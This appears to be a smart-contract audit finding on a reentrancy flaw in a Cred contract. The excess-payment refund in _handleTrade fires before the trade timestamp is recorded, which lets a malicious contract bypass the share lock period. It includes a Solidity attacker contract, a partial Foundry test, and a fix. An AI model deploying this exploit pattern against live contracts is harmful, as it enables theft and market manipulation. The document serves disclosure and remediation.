# Vulnerability details

## Description
In `Cred::buyShareCred`, which is called in the flow when `creator` calls `Cred::createCred`, creates a credential or a share buyer directly calls `Cred::buyShareCred` to buy the share of already existing credential.
The protocol expects the buyer to wait for `SHARE_LOCK_PERIOD` mentioned via protocol. This is done so that a malicious creator or share purchaser does not buy `X` share and make the left over shares costly for another user.
Thus creator benefits from the `creatorFee` of the costly shares and then after that malicious creator sells the `X` shares in the same transaction.

This could be done indefinitely thus benefiting the creator/share buyer. So `SHARE_LOCK_PERIOD` is introduced so that the purchaser has to hold on to the share for the mentioned time and cannot sell it immideiatly.

But what if creator is not an `EOA` but rather a `smart contract`, here is what the flow will look like to exploit the attack :
- `external createCred()` -> `internal _createCredInternal()` -> `public buyShareCred()` -> `internal _handleTrade()` & then immideiatly `public sellShareCred()`.
the exploit could happen in 2 ways, firstly creator calls and `createCred()` & sells the share. secondly any buyer calls `buyShareCred()` for existing `credId` & sells the share.

look below at `Cred::handleTrade` where explit takes place :

as we can see the smart contract buys a share & knowingly pays more than the fees so that the `excessPayment > 0` gets activated and calls the smart contract back to send the excessPayment.
this is the opportunity for the smart contract to `RE_ENTER` the function `_handleTrade()` via `sellShareCred()` & sell there share as `lastTradeTimestamp[credId_][curator_] = block.timestamp;`
did not get executed and `lastTradeTimestamp[credId_][curator_] ` stores `0` in it, so when condition `block.timestamp <= lastTradeTimestamp[credId_][curator_] + SHARE_LOCK_PERIOD` is checked while selling
it does not revert cuzz enough time has been passed `since lastTradeTimestamp which is 0` and thus creator is able to sell share.

## Impact
- breaks the Invariant of the protocol, which should under no condition must be broken.

## Proof of Concept
Add the below code in `Cred.t.sol`

```solidity
  contract MaliciousContract {
  bytes public signedData;
  bytes public signature;
  uint16 public buyShareRoyalty;
  uint16 public sellShareRoyalty;

  Cred public immutable cred;
  BondingCurve public immutable bondingCurve;

  bool public flag = true;

  constructor(address cred_, address bondingCurve_) {
    cred = Cred(cred_);
    bondingCurve = BondingCurve(bondingCurve_);
  }

  fallback() external payable {
    if(flag){
      flag = false;
      cred.sellShareCred(1, 1, 0);
    }
  }

  function attack(bytes calldata signedData_, bytes calldata signature_, uint16 buyShareRoyalty_, uint16 sellShareRoyalty_) external payable {
    signedData = signedData_;
    signature = signature_;
    buyShareRoyalty = buyShareRoyalty_;
    sellShareRoyalty = sellShareRoyalty_;
    uint256 buyPrice = bondingCurve.getBuyPriceAfterFee(1, 0, 1);
    cred.createCred{ value: buyPrice + 1 ether}(address(this), signedData, signature, buyShareRoyalty, sellShareRoyalty);

  }
}



  function test_Reentrancy() public {
    // Deploy a contract with cred.sol address & bondingCurve.sol address
    MaliciousContract malicious = new MaliciousContract(address(cred), address(bondingCurve));
    // give it some ether to perform the attack
    vm.deal(address(malicious), 10 ether);

    // a big expiryTime, so that our tx does not expiry according to protocol
    uint256 expiresIn = 100000000000;
    string memory credURL = "test";
    string memory credType = "BASIC";
    string memory verificationType = "SIGNATURE";
    bytes32 merkleRoot = 0x00;

    // preparing our data to be signed via protocol expected signerAddress
    bytes memory signCreateData = abi.encode(
      expiresIn, address(malicious), 31_337, address(bondingCurve), credURL, credType, verificationType, merkleRoot
    );

    // hashing our data, to be signed via protocol expected signerAddress
    bytes32 createMsgHash = keccak256(signCreateData);
    // converting it to `EthSignedMessageHash`
    bytes32 createDigest = ECDSA.toEthSignedMessageHash(createMsgHash);
    // finally signing the data via signerAddress
    (uint8 cv, bytes32 cr, bytes32 cs) = vm.sign(claimSignerPrivateKey, createDigest);
    if (cv != 27) cs = cs | bytes32(uint256(1) << 255);
```

## Recommended Mitigation Steps
- add `Nonreentrant` modifier in `Cred::_handleTrade()`
- make the `Cred::_handleTrade()` `CEI` commapitable as below :
```diff
        ...
        if (isBuy) {
            cred.currentSupply += amount_;
            uint256 excessPayment = msg.value - price - protocolFee - creatorFee;
+           lastTradeTimestamp[credId_][curator_] = block.timestamp;
            if (excessPayment > 0) {
                _msgSender().safeTransferETH(excessPayment);
            }
-           lastTradeTimestamp[credId_][curator_] = block.timestamp;
        } else {
            cred.currentSupply -= amount_;
            curator_.safeTransferETH(price - protocolFee - creatorFee);
        }
        ...
```
